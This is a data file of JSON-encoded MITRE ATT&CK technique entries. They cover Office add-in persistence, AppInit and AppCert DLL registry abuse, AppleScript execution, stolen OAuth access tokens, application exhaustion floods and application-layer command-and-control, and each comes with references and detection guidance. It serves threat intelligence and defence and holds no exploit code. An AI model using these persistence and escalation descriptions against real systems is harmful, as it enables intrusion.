    "{\"created\":\"2019-11-07T19:52:52.801Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\\n\\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. \",\"external_references\":[{\"external_id\":\"T1137.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1137/006\"},{\"description\":\"Microsoft. (n.d.). Add or remove add-ins. Retrieved July 3, 2017.\",\"source_name\":\"Microsoft Office Add-ins\",\"url\":\"https://support.office.com/article/Add-or-remove-add-ins-0af570c4-5cf3-4fa9-9b88-403625a0b460\"},{\"description\":\"Knowles, W. (2017, April 21). Add-In Opportunities for Office Persistence. Retrieved July 3, 2017.\",\"source_name\":\"MRWLabs Office Persistence Add-ins\",\"url\":\"https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/\"},{\"description\":\"Caban, D. and Hirani, M. (2018, October 3). You’ve Got Mail! Enterprise Email Compromise. Retrieved April 22, 2019.\",\"source_name\":\"FireEye Mail CDS 2018\",\"url\":\"https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s03-youve-got-mail.pdf\"},{\"description\":\"Shukrun, S. (2019, June 2). Office Templates and GlobalDotName - A Stealthy Office Persistence Technique. Retrieved August 26, 2019.\",\"source_name\":\"GlobalDotName Jun 2019\",\"url\":\"https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique\"}],\"id\":\"attack-pattern--34f1d81d-fe88-4f97-bd3b-a3164536255d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-26T17:34:02.877Z\",\"name\":\"Add-ins\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"File monitoring\",\"Windows Registry\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins)\\n\\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-19T16:10:15.008Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may add adversary-controlled credentials for Azure Service Principals in addition to existing legitimate credentials(Citation: Create Azure Service Principal) to maintain persistent access to victim Azure accounts.(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) Azure Service Principals support both password and certificate credentials.(Citation: Why AAD Service Principals) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules.(Citation: Demystifying Azure AD Service Principals)\",\"external_references\":[{\"external_id\":\"T1098.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1098/001\"},{\"description\":\"Microsoft. (2020, January 8). Create an Azure service principal with Azure CLI. Retrieved January 19, 2020.\",\"source_name\":\"Create Azure Service Principal\",\"url\":\"https://docs.microsoft.com/en-us/cli/azure/create-an-azure-service-principal-azure-cli?toc=%2Fazure%2Fazure-resource-manager%2Ftoc.json&view=azure-cli-latest\"},{\"description\":\"Kunz, Bryce. (2018, May 11). Blue Cloud of Death: Red Teaming Azure. Retrieved October 23, 2019.\",\"source_name\":\"Blue Cloud of Death\",\"url\":\"https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1\"},{\"description\":\"Kunz, Bruce. (2018, October 14). Blue Cloud of Death: Red Teaming Azure. Retrieved November 21, 2019.\",\"source_name\":\"Blue Cloud of Death Video\",\"url\":\"https://www.youtube.com/watch?v=wQ1CuAPnrLM&feature=youtu.be&t=2815\"},{\"description\":\"Microsoft. (2019, September 23). Azure Superpowers Lab Manual. Retrieved January 19, 2020.\",\"source_name\":\"Why AAD Service Principals\",\"url\":\"https://github.com/microsoft/AzureSuperpowers/blob/master/docs/AzureSuperpowers.md#why-aad-service-principals\"},{\"description\":\"Bellavance, Ned. (2019, July 16). Demystifying Azure AD Service Principals. Retrieved January 19, 2020.\",\"source_name\":\"Demystifying Azure AD Service Principals\",\"url\":\"https://nedinthecloud.com/2019/07/16/demystifying-azure-ad-service-principals/\"}],\"id\":\"attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-05-04T18:36:05.417Z\",\"name\":\"Additional Azure Service Principal Credentials\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Jannie Li, Microsoft Threat Intelligence\u{202f}Center\u{202f}(MSTIC)\"],\"x_mitre_data_sources\":[\"Azure activity logs\"],\"x_mitre_detection\":\"Monitor Azure Activity Logs for service principal modifications.\\n\\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Azure AD\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1182\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1182\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"},{\"description\":\"Microsoft. (2007, October 24). Windows Sysinternals - AppCertDlls. Retrieved December 18, 2017.\",\"source_name\":\"Sysinternals AppCertDlls Oct 2007\",\"url\":\"https://forum.sysinternals.com/appcertdlls_topic12546.html\"}],\"id\":\"attack-pattern--4bf5845d-a814-4490-bc5c-ccdee6043025\",\"modified\":\"2020-01-24T14:48:05.567Z\",\"name\":\"AppCert DLLs\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T14:47:41.795Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Endgame Process Injection July 2017)\\n\\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. \",\"external_references\":[{\"external_id\":\"T1546.009\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/009\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"},{\"description\":\"Microsoft. (2007, October 24). Windows Sysinternals - AppCertDlls. Retrieved December 18, 2017.\",\"source_name\":\"Sysinternals AppCertDlls Oct 2007\",\"url\":\"https://forum.sysinternals.com/appcertdlls_topic12546.html\"}],\"id\":\"attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T20:22:45.298Z\",\"name\":\"AppCert DLLs\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Registry\",\"Process command-line parameters\",\"Process monitoring\",\"Loaded DLLs\"],\"x_mitre_detection\":\"Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Endgame Process Injection July 2017) \\n\\nTools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007)\\n\\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.\",\"x_mitre_effective_permissions\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:15.409Z\",\"external_references\":[{\"external_id\":\"T1103\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1103\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"Microsoft. (2006, October). Working with the AppInit_DLLs registry value. Retrieved July 15, 2015.\",\"source_name\":\"AppInit Registry\",\"url\":\"https://support.microsoft.com/en-us/kb/197571\"},{\"description\":\"Microsoft. (n.d.). AppInit DLLs and Secure Boot. Retrieved July 15, 2015.\",\"source_name\":\"AppInit Secure Boot\",\"url\":\"https://msdn.microsoft.com/en-us/library/dn280412\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--317fefa6-46c7-4062-adb6-2008cf6bcb41\",\"modified\":\"2020-01-24T14:52:55.240Z\",\"name\":\"AppInit DLLs\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T14:52:25.589Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Wow6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Endgame Process Injection July 2017)\\n\\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \\n\\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)\",\"external_references\":[{\"external_id\":\"T1546.010\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/010\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"Microsoft. (2006, October). Working with the AppInit_DLLs registry value. Retrieved July 15, 2015.\",\"source_name\":\"AppInit Registry\",\"url\":\"https://support.microsoft.com/en-us/kb/197571\"},{\"description\":\"Microsoft. (n.d.). AppInit DLLs and Secure Boot. Retrieved July 15, 2015.\",\"source_name\":\"AppInit Secure Boot\",\"url\":\"https://msdn.microsoft.com/en-us/library/dn280412\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T20:34:09.996Z\",\"name\":\"AppInit DLLs\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Registry\",\"Process command-line parameters\",\"Process monitoring\",\"Loaded DLLs\"],\"x_mitre_detection\":\"Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Endgame Process Injection July 2017)\\n\\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. (Citation: TechNet Autoruns) \\n\\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.\",\"x_mitre_effective_permissions\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Secure boot disabled on systems running Windows 8 and later\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1155\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1155\"},{\"description\":\"Yerko Grbic. (2017, February 14). Macro Malware Targets Macs. Retrieved July 8, 2017.\",\"source_name\":\"Macro Malware Targets Macs\",\"url\":\"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/macro-malware-targets-macs/\"}],\"id\":\"attack-pattern--5ad95aaa-49c1-4784-821d-2e83f47b079b\",\"modified\":\"2020-04-14T13:26:00.846Z\",\"name\":\"AppleScript\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-09T14:07:54.329Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. (Citation: Apple AppleScript) These AppleEvent messages can be easily scripted with AppleScript for local or remote execution.\\n\\n<code>osascript</code> executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the <code>osalang</code> program. AppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\\n\\nAdversaries can use this to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they\'re already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006)(Citation: Macro Malware Targets Macs). Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \\\"script here\\\"</code>.\",\"external_references\":[{\"external_id\":\"T1059.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1059/002\"},{\"description\":\"Apple. (2016, January 25). Introduction to AppleScript Language Guide. Retrieved March 28, 2020.\",\"source_name\":\"Apple AppleScript\",\"url\":\"https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html\"},{\"description\":\"Yerko Grbic. (2017, February 14). Macro Malware Targets Macs. Retrieved July 8, 2017.\",\"source_name\":\"Macro Malware Targets Macs\",\"url\":\"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/macro-malware-targets-macs/\"}],\"id\":\"attack-pattern--37b11151-1776-4f8f-b328-30939fbf2ceb\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-04-14T13:28:17.696Z\",\"name\":\"AppleScript\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Monitor for execution of AppleScript through osascript that may be related to other suspicious behavior occurring on the system.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-08-30T12:55:58.607Z\",\"external_references\":[{\"external_id\":\"T1527\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1527\"},{\"description\":\"Auth0. (n.d.). Why You Should Always Use Access Tokens to Secure APIs. Retrieved September 12, 2019.\",\"source_name\":\"Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019\",\"url\":\"https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/\"},{\"description\":\"okta. (n.d.). What Happens If Your JWT Is Stolen?. Retrieved September 12, 2019.\",\"source_name\":\"okta\",\"url\":\"https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen\"},{\"description\":\"Cai, S., Flores, J., de Guzman, C., et. al.. (2019, August 27). Microsoft identity platform access tokens. Retrieved October 4, 2019.\",\"source_name\":\"Microsoft Identity Platform Access 2019\",\"url\":\"https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens\"},{\"description\":\"Stalmans, E.. (2017, August 2). Phishing with OAuth and o365/Azure. Retrieved October 4, 2019.\",\"source_name\":\"Staaldraad Phishing with OAuth 2017\",\"url\":\"https://staaldraad.github.io/2017/08/02/o356-phishing-with-oauth/\"}],\"id\":\"attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a\",\"modified\":\"2020-03-23T15:59:40.457Z\",\"name\":\"Application Access Token\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-30T17:37:22.261Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\\n\\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\\n\\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \\\"refresh\\\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\\n\\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\",\"external_references\":[{\"external_id\":\"T1550.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1550/001\"},{\"description\":\"Auth0. (n.d.). Why You Should Always Use Access Tokens to Secure APIs. Retrieved September 12, 2019.\",\"source_name\":\"Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019\",\"url\":\"https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/\"},{\"description\":\"okta. (n.d.). What Happens If Your JWT Is Stolen?. Retrieved September 12, 2019.\",\"source_name\":\"okta\",\"url\":\"https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen\"},{\"description\":\"Cai, S., Flores, J., de Guzman, C., et. al.. (2019, August 27). Microsoft identity platform access tokens. Retrieved October 4, 2019.\",\"source_name\":\"Microsoft Identity Platform Access 2019\",\"url\":\"https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens\"},{\"description\":\"Stalmans, E.. (2017, August 2). Phishing with OAuth and o365/Azure. Retrieved October 4, 2019.\",\"source_name\":\"Staaldraad Phishing with OAuth 2017\",\"url\":\"https://staaldraad.github.io/2017/08/02/o356-phishing-with-oauth/\"}],\"id\":\"attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-23T20:24:52.899Z\",\"name\":\"Application Access Token\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Shailesh Tiwary (Indian Army)\",\"Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)\",\"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)\",\"Mark Wee\"],\"x_mitre_data_sources\":[\"Office 365 audit logs\",\"OAuth audit logs\"],\"x_mitre_defense_bypassed\":[\"System Access Controls\"],\"x_mitre_detection\":\"Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Office 365\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:27.755Z\",\"external_references\":[{\"external_id\":\"T1017\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1017\"},{\"external_id\":\"CAPEC-187\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/187.html\"}],\"id\":\"attack-pattern--327f3cc5-eea1-42d4-a6cd-ed34b7ce8f61\",\"modified\":\"2020-03-23T15:40:50.965Z\",\"name\":\"Application Deployment Software\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-20T15:35:00.025Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may target resource intensive features of web applications to cause a denial of service (DoS). Specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself. (Citation: Arbor AnnualDoSreport Jan 2018)\",\"external_references\":[{\"external_id\":\"T1499.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1499/003\"},{\"description\":\"Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight into the Global Threat Landscape - Netscout Arbor\'s 13th Annual Worldwide Infrastructure Security Report. Retrieved April 22, 2019.\",\"source_name\":\"Arbor AnnualDoSreport Jan 2018\",\"url\":\"https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf\"},{\"description\":\"Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.\",\"source_name\":\"Cisco DoSdetectNetflow\",\"url\":\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\"}],\"id\":\"attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-29T02:01:10.832Z\",\"name\":\"Application Exhaustion Flood\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network device logs\",\"Network device logs\",\"Network intrusion detection system\",\"Web application firewall logs\",\"Web logs\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\\n\\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:56.776Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. \",\"external_references\":[{\"external_id\":\"T1071\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1071\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-27T19:02:44.772Z\",\"name\":\"Application Layer Protocol\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"DNS records\",\"Network protocol analysis\",\"Packet capture\",\"Netflow/Enclave netflow\",\"Process use of network\",\"Process monitoring\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"2.0\"}",
